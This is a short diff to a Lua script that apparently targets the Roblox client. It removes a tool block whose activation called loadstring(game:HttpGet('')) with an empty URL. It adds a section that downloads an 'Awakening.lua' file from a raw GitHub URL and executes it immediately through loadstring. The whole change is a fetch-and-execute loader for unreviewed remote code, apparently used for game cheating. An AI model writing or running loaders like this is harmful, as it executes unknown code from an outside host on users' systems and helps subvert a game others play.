@@ -111,24 +111,7 @@ tool.Activated:Connect(onActivated)
 tool.Parent = game.Players.LocalPlayer.Backpack
 
 
-
---FIVE SEASONS TEST
--- Create the tool
-local tool = Instance.new("Tool")
-tool.Name = "Awakening 1"  -- Updated tool name
-tool.RequiresHandle = false  -- No handle required
- 
--- Insert the tool into the player's backpack
-tool.Parent = game.Players.LocalPlayer.Backpack
- 
--- Function to execute when the tool is activated
-local function onActivated()
-    loadstring(game:HttpGet(""))()
-end
- 
--- Connect the activation function to the tool's Activated event
-tool.Activated:Connect(onActivated)
- 
--- Add the tool to the player's backpack
-tool.Parent = game.Players.LocalPlayer.Backpack
-
+--AWAKENING TOOL
+local url = "https://raw.githubusercontent.com/Herobrine697448/KJ/refs/heads/main/Awakenings/Awakening.lua"
+local scriptContent = game:HttpGet(url, true) -- Fetch the script
+loadstring(scriptContent)() -- Execute the script
